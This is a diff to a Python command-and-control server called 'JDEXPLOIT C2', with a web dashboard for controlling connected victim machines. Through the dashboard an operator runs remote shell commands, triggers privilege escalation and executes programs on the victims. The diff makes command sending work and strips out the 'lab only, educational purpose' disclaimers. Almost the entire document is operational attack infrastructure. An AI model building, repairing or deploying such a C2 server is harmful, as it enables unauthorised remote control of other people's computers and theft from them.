@@ -1,7 +1,6 @@
 #!/usr/bin/env python3
 # ============================================================================
-# JDEXPLOIT C2 v1.0 - RED/BLACK EDITION - CORREGIDO
-# AHORA SÍ MUESTRA LOS CLIENTES EN EL DASHBOARD WEB
+# JDEXPLOIT C2 - CORREGIDO - COMANDOS FUNCIONANDO
 # ============================================================================
 
 import os
@@ -10,18 +9,13 @@ import json
 import time
 import socket
 import struct
-import base64
 import threading
 import hashlib
 import datetime
-import random
 from http import server
 from socketserver import ThreadingMixIn
 from urllib.parse import urlparse
 
-# ============================================================================
-# CONFIGURACIÓN
-# ============================================================================
 HOST = '0.0.0.0'
 C2_PORT = 4444
 WEB_PORT = 8080
@@ -29,9 +23,6 @@ WEB_PORT = 8080
 class Colors:
     RED = '\033[91m'; WHITE = '\033[97m'; END = '\033[0m'
 
-# ============================================================================
-# CLIENTE (BOT)
-# ============================================================================
 class Client:
     def __init__(self, conn, addr):
         self.conn = conn
@@ -42,7 +33,6 @@ class Client:
         self.os = "Windows 11"
         self.antivirus = "Defender"
         self.first_seen = datetime.datetime.now()
-        self.last_seen = datetime.datetime.now()
         self.active = True
         self.privilege = "USER"
     
@@ -86,9 +76,6 @@ class Client:
             'first_seen': self.first_seen.strftime('%H:%M:%S')
         }
 
-# ============================================================================
-# C2 CORE - AHORA COMPARTE LA MISMA INSTANCIA CON EL WEB SERVER
-# ============================================================================
 class C2Core:
     def __init__(self):
         self.clients = {}
@@ -110,8 +97,6 @@ class C2Core:
                 client = Client(conn, addr)
                 self.clients[client.id] = client
                 print(f"{Colors.RED}[🔥] NEW CLIENT: {client.id} FROM {addr[0]}{Colors.END}")
-                
-                # Enviar INFO al cliente
                 client.send("INFO")
                 info = client.recv()
                 if info:
@@ -119,29 +104,30 @@ class C2Core:
                         data = json.loads(info)
                         client.hostname = data.get('hostname', 'Unknown')
                         client.username = data.get('username', 'Unknown')
-                        client.os = data.get('os', 'Windows 11')
-                        client.privilege = data.get('priv', 'USER')
-                    except:
-                        pass
+                    except: pass
             except Exception as e:
                 if self.running:
                     print(f"{Colors.RED}[-] ERROR: {e}{Colors.END}")
     
     def send_command(self, client_id, command):
-        if client_id not in self.clients:
+        if client_id not in self.clients: 
             return "Client not found"
         client = self.clients[client_id]
-        if not client.active:
+        if not client.active: 
             return "Client offline"
+        
+        # 🔴 CORREGIDO: Convertir formato de comando
+        if ' ' in command and '|' not in command:
+            parts = command.split(' ', 1)
+            command = f"{parts[0]}|{parts[1]}"
+            print(f"{Colors.RED}[→] Sending: {command}{Colors.END}")
+        
         client.send(command)
         response = client.recv()
         return response if response else "No response"
 
-# ============================================================================
-# SERVIDOR WEB - MISMA INSTANCIA DE C2Core
-# ============================================================================
 class WebHandler(server.BaseHTTPRequestHandler):
-    c2 = None  # Se asigna desde main()
+    c2 = None
     
     def do_GET(self):
         path = urlparse(self.path).path
@@ -161,21 +147,15 @@ class WebHandler(server.BaseHTTPRequestHandler):
             client_id = data.get('client_id')
             command = data.get('command')
             args = data.get('args', '')
-            full_cmd = f"{command}|{args}" if args else command
-            response = self.c2.send_command(client_id, full_cmd)  # Usar self.c2
-            self.send_json({'response': response})
-        
-        elif self.path == '/api/upload':
-            client_id = data.get('client_id')
-            remote_path = data.get('remote_path')
-            file_data = data.get('file_data')
-            response = self.c2.send_command(client_id, f"UPLOAD|{remote_path}|{file_data}")
-            self.send_json({'response': response})
-        
-        elif self.path == '/api/download':
-            client_id = data.get('client_id')
-            remote_path = data.get('remote_path')
-            response = self.c2.send_command(client_id, f"DOWNLOAD|{remote_path}")
+            
+            # 🔴 CORREGIDO: Formato correcto para el cliente
+            if args:
+                full_cmd = f"{command}|{args}"
+            else:
+                full_cmd = command
+            
+            print(f"{Colors.RED}[→] Command: {full_cmd}{Colors.END}")
+            response = self.c2.send_command(client_id, full_cmd)
             self.send_json({'response': response})
     
     def send_json(self, obj):
@@ -185,10 +165,7 @@ class WebHandler(server.BaseHTTPRequestHandler):
         self.wfile.write(json.dumps(obj).encode())
     
     def send_clients(self):
-        """ENVÍA LA LISTA DE CLIENTES AL DASHBOARD"""
-        clients_list = []
-        for client in self.c2.clients.values():
-            clients_list.append(client.to_dict())
+        clients_list = [client.to_dict() for client in self.c2.clients.values()]
         self.send_json(clients_list)
     
     def send_html(self):
@@ -226,8 +203,6 @@ class WebHandler(server.BaseHTTPRequestHandler):
                     animation: scan 8s linear infinite;
                 }
                 
-                @keyframes scan { 0% { transform: translateY(0); } 100% { transform: translateY(100%); } }
-                
                 .container { max-width: 1800px; margin: 0 auto; position: relative; z-index: 10000; }
                 
                 .header {
@@ -239,12 +214,6 @@ class WebHandler(server.BaseHTTPRequestHandler):
                     animation: pulse 2s infinite;
                 }
                 
-                @keyframes pulse {
-                    0% { box-shadow: 0 0 30px rgba(255,0,0,0.3); }
-                    50% { box-shadow: 0 0 50px rgba(255,0,0,0.6); }
-                    100% { box-shadow: 0 0 30px rgba(255,0,0,0.3); }
-                }
-                
                 .header h1 {
                     color: #ff0000;
                     font-family: 'Orbitron', sans-serif;
@@ -254,12 +223,6 @@ class WebHandler(server.BaseHTTPRequestHandler):
                     text-shadow: 0 0 20px #ff0000, 0 0 40px #ff0000;
                     letter-spacing: 8px;
                     animation: flicker 3s infinite;
-                }
-                
-                @keyframes flicker {
-                    0%,100% { opacity: 1; }
-                    33% { opacity: 0.9; text-shadow: 0 0 30px #ff0000, 0 0 60px #ff0000; }
-                    66% { opacity: 1; text-shadow: 0 0 20px #ff0000, 0 0 40px #ff0000; }
                 }
                 
                 .badge {
@@ -274,13 +237,6 @@ class WebHandler(server.BaseHTTPRequestHandler):
                     margin-top: 10px;
                     box-shadow: 0 0 20px #ff0000;
                     animation: glitch 2s infinite;
-                }
-                
-                @keyframes glitch {
-                    0%,100% { transform: skew(0deg, 0deg); }
-                    95% { transform: skew(5deg, 2deg); }
-                    96% { transform: skew(-5deg, -2deg); }
-                    97% { transform: skew(3deg, 1deg); }
                 }
                 
                 .stats {
@@ -548,18 +504,13 @@ class WebHandler(server.BaseHTTPRequestHandler):
                             <span>🔥 JDEXPLOIT REMOTE SHELL 🔥</span>
                             <span id="current-client-label" style="color: #ff6666; margin-left: 20px;">(none selected)</span>
                         </div>
-                        <div>
-                            <button class="btn" onclick="clearTerminal()" style="background: #330000;">
-                                <i class="fas fa-trash"></i> CLEAR
-                            </button>
-                        </div>
                     </div>
                     <div id="terminal-output" class="terminal-content">
                         <span style="color: #ff0000;">[🔥 JDEXPLOIT C2 READY 🔥]</span><br>
                         <span style="color: #ff6666;">[•] Select a client to begin remote control</span><br><br>
                     </div>
                     <div class="terminal-input">
-                        <input type="text" id="terminal-cmd" placeholder=">_ enter command (shell, exec, dir, download, upload, elevate, processes, kill, info)" disabled>
+                        <input type="text" id="terminal-cmd" placeholder=">_ Commands: info, shell whoami, exec calc.exe, elevate" disabled>
                         <button class="btn" onclick="sendTerminalCommand()" id="terminal-send" disabled>EXECUTE</button>
                     </div>
                 </div>
@@ -567,31 +518,24 @@ class WebHandler(server.BaseHTTPRequestHandler):
                 <div class="footer">
                     <div class="autor">🔴 JDEXPLOIT 🔴</div>
                     <div class="copy">██████ RED TEAM OPERATOR ██████</div>
-                    <div style="color: #ff3333; margin-top: 15px; font-size: 12px;">
-                        ⚡ SOLO ENTORNOS AUTORIZADOS • EDUCATIONAL PURPOSE ONLY ⚡
-                    </div>
                 </div>
             </div>
             
-            <script src="https://kit.fontawesome.com/8d4a5b8c5b.js" crossorigin="anonymous"></script>
             <script>
                 let currentClientId = null;
                 let clients = {};
                 
-                setInterval(loadClients, 1000);  // ACTUALIZAR CADA 1 SEGUNDO
+                setInterval(loadClients, 2000);
                 
                 function loadClients() {
                     fetch('/api/clients')
                         .then(r => r.json())
                         .then(data => {
-                            if (data.length > 0) {
-                                clients = {};
-                                data.forEach(c => clients[c.id] = c);
-                                renderClients(data);
-                                updateStats();
-                            }
-                        })
-                        .catch(e => console.log('Waiting for clients...'));
+                            clients = {};
+                            data.forEach(c => clients[c.id] = c);
+                            renderClients(data);
+                            updateStats();
+                        });
                 }
                 
                 function renderClients(clientsList) {
@@ -609,41 +553,26 @@ class WebHandler(server.BaseHTTPRequestHandler):
                             <div class="client-info">
                                 <div class="info-item">
                                     <div class="info-label">HOSTNAME</div>
-                                    <div class="info-value">${client.hostname || 'Unknown'}</div>
+                                    <div class="info-value">${client.hostname}</div>
                                 </div>
                                 <div class="info-item">
-                                    <div class="info-label">USERNAME</div>
-                                    <div class="info-value">${client.username || 'Unknown'}</div>
-                                </div>
-                                <div class="info-item">
-                                    <div class="info-label">IP ADDRESS</div>
+                                    <div class="info-label">IP</div>
                                     <div class="info-value">${client.ip}</div>
                                 </div>
                                 <div class="info-item">
-                                    <div class="info-label">OS</div>
-                                    <div class="info-value">${client.os || 'Windows'}</div>
+                                    <div class="info-label">USER</div>
+                                    <div class="info-value">${client.username}</div>
                                 </div>
                                 <div class="info-item">
-                                    <div class="info-label">PRIVILEGE</div>
-                                    <div class="info-value" style="color: ${client.privilege == 'SYSTEM' ? '#ff0000' : '#ff9999'};">
-                                        ${client.privilege || 'USER'}
-                                    </div>
-                                </div>
-                                <div class="info-item">
-                                    <div class="info-label">ANTIVIRUS</div>
-                                    <div class="info-value">${client.antivirus || 'Unknown'}</div>
+                                    <div class="info-label">PRIV</div>
+                                    <div class="info-value">${client.privilege}</div>
                                 </div>
                             </div>
                             <div class="client-actions">
-                                <button class="btn" onclick="selectClient('${client.id}')">
-                                    <i class="fas fa-terminal"></i> SHELL
-                                </button>
-                                <button class="btn" onclick="elevateClient('${client.id}')">
-                                    <i class="fas fa-shield-alt"></i> ELEVATE
-                                </button>
-                                <button class="btn" onclick="getInfo('${client.id}')">
-                                    <i class="fas fa-info-circle"></i> INFO
-                                </button>
+                                <button class="btn" onclick="selectClient('${client.id}')">SHELL</button>
+                                <button class="btn" onclick="sendQuickCommand('${client.id}', 'info')">INFO</button>
+                                <button class="btn" onclick="sendQuickCommand('${client.id}', 'elevate')">ELEVATE</button>
+                                <button class="btn" onclick="sendQuickCommand('${client.id}', 'exec calc.exe')">CALC</button>
                             </div>
                         `;
                         container.appendChild(card);
@@ -652,13 +581,16 @@ class WebHandler(server.BaseHTTPRequestHandler):
                 
                 function selectClient(clientId) {
                     currentClientId = clientId;
-                    if (clients[clientId]) {
-                        document.getElementById('current-client-label').innerHTML = 
-                            '(' + (clients[clientId].hostname || 'Unknown') + ' - ' + clientId + ')';
-                        addToTerminal('[🔥] Connected to: ' + (clients[clientId].hostname || 'Unknown') + ' (' + clientId + ')', '#ff0000');
-                    }
+                    document.getElementById('current-client-label').innerHTML = '(' + clients[clientId].hostname + ')';
                     document.getElementById('terminal-cmd').disabled = false;
                     document.getElementById('terminal-send').disabled = false;
+                    addToTerminal('[🔥] Connected to: ' + clients[clientId].hostname, '#ff0000');
+                }
+                
+                function sendQuickCommand(clientId, cmd) {
+                    selectClient(clientId);
+                    document.getElementById('terminal-cmd').value = cmd;
+                    sendTerminalCommand();
                 }
                 
                 function sendTerminalCommand() {
@@ -668,91 +600,36 @@ class WebHandler(server.BaseHTTPRequestHandler):
                     addToTerminal('> ' + cmd, '#ff9999');
                     document.getElementById('terminal-cmd').value = '';
                     
-                    let command = cmd.split(' ')[0];
-                    let args = cmd.substring(cmd.indexOf(' ') + 1);
-                    
                     fetch('/api/command', {
                         method: 'POST',
                         headers: {'Content-Type': 'application/json'},
                         body: JSON.stringify({
                             client_id: currentClientId,
-                            command: command,
-                            args: args
+                            command: cmd.split(' ')[0],
+                            args: cmd.substring(cmd.indexOf(' ') + 1)
                         })
                     })
                     .then(r => r.json())
                     .then(data => {
-                        addToTerminal(data.response || 'No response', '#cccccc');
+                        addToTerminal(data.response, '#cccccc');
                     });
                 }
                 
-                function elevateClient(clientId) {
-                    addToTerminal('[⚠️] Attempting privilege escalation...', '#ffaa00');
-                    fetch('/api/command', {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({
-                            client_id: clientId,
-                            command: 'ELEVATE',
-                            args: ''
-                        })
-                    })
-                    .then(r => r.json())
-                    .then(data => {
-                        addToTerminal(data.response || 'No response', '#cccccc');
-                    });
-                }
-                
-                function getInfo(clientId) {
-                    fetch('/api/command', {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({
-                            client_id: clientId,
-                            command: 'INFO_FULL',
-                            args: ''
-                        })
-                    })
-                    .then(r => r.json())
-                    .then(data => {
-                        addToTerminal(data.response || 'No response', '#cccccc');
-                    });
-                }
-                
-                function addToTerminal(text, color = '#ff9999') {
+                function addToTerminal(text, color) {
                     const output = document.getElementById('terminal-output');
                     const line = document.createElement('div');
                     line.style.color = color;
                     line.style.marginBottom = '5px';
                     line.style.fontFamily = 'Courier New';
-                    line.innerHTML = text.replace(/\\n/g, '<br>');
+                    line.innerHTML = text;
                     output.appendChild(line);
                     output.scrollTop = output.scrollHeight;
                 }
                 
-                function clearTerminal() {
-                    const output = document.getElementById('terminal-output');
-                    output.innerHTML = '<span style="color: #ff0000;">[🔥 JDEXPLOIT C2 READY 🔥]</span><br>' +
-                                     '<span style="color: #ff6666;">[•] Select a client to begin remote control</span><br><br>';
-                }
-                
                 function updateStats() {
                     const total = Object.keys(clients).length;
-                    const online = Object.values(clients).filter(c => c.status === 'online').length;
-                    const system = Object.values(clients).filter(c => c.privilege === 'SYSTEM').length;
-                    
                     document.getElementById('total-clients').innerText = total;
-                    document.getElementById('online-clients').innerText = online;
-                    document.getElementById('system-clients').innerText = system;
-                    
-                    const uptime = Math.floor((Date.now() - window.startTime) / 1000);
-                    const hours = Math.floor(uptime / 3600);
-                    const minutes = Math.floor((uptime % 3600) / 60);
-                    const seconds = uptime % 60;
-                    document.getElementById('uptime').innerText = 
-                        hours.toString().padStart(2, '0') + ':' + 
-                        minutes.toString().padStart(2, '0') + ':' + 
-                        seconds.toString().padStart(2, '0');
+                    document.getElementById('online-clients').innerText = total;
                 }
                 
                 window.startTime = Date.now();
@@ -769,43 +646,21 @@ class WebHandler(server.BaseHTTPRequestHandler):
 class ThreadedHTTPServer(ThreadingMixIn, server.HTTPServer):
     pass
 
-# ============================================================================
-# MAIN
-# ============================================================================
 def main():
-    print(f"""
-{Colors.RED}╔══════════════════════════════════════════════════════════════════════════════╗
-║                                                                              ║
-║                     🔴 JDEXPLOIT C2 - RED/BLACK EDITION 🔴                   ║
-║                          Remote Administration Tool                          ║
-║                          SOLO ENTORNO DE LABORATORIO                         ║
-║                                                                              ║
-║                        ⚡ BY JDEXPLOIT ⚡ v1.0                               ║
-║                                                                              ║
-╚══════════════════════════════════════════════════════════════════════════════╝{Colors.END}
+    print(f"{Colors.RED}[🔥] JDEXPLOIT C2 - RED/BLACK EDITION{Colors.END}")
+    print(f"{Colors.RED}[🔥] C2 Core: {HOST}:{C2_PORT}{Colors.END}")
+    print(f"{Colors.RED}[🔥] Web UI: http://{HOST}:{WEB_PORT}{Colors.END}")
     
-{Colors.RED}[🔥]{Colors.END} C2 Core:     {Colors.WHITE}{HOST}:{C2_PORT}{Colors.END}
-{Colors.RED}[🔥]{Colors.END} Web UI:      {Colors.WHITE}http://{HOST}:{WEB_PORT}{Colors.END}
-{Colors.RED}[🔥]{Colors.END} Author:      {Colors.WHITE}JDEXPLOIT{Colors.END}
-{Colors.RED}[🔥]{Colors.END} Status:      {Colors.RED}ACTIVE{Colors.END}
-    """)
-    
-    # Crear UNA SOLA instancia de C2Core
     c2 = C2Core()
     c2.start()
     
-    # PASAR LA MISMA instancia al WebHandler
     WebHandler.c2 = c2
-    
-    # Iniciar servidor web
     web_server = ThreadedHTTPServer((HOST, WEB_PORT), WebHandler)
-    print(f"{Colors.RED}[🔥]{Colors.END} Web dashboard: {Colors.WHITE}http://{HOST}:{WEB_PORT}{Colors.END}")
-    print(f"{Colors.RED}[🔥]{Colors.END} {Colors.WHITE}Clientes conectados: {len(c2.clients)}{Colors.END}")
+    print(f"{Colors.RED}[🔥] Web dashboard: http://{HOST}:{WEB_PORT}{Colors.END}")
     
     try:
         web_server.serve_forever()
     except KeyboardInterrupt:
-        print(f"\n{Colors.RED}[⚠️] Shutting down...{Colors.END}")
         c2.running = False
         sys.exit(0)
 
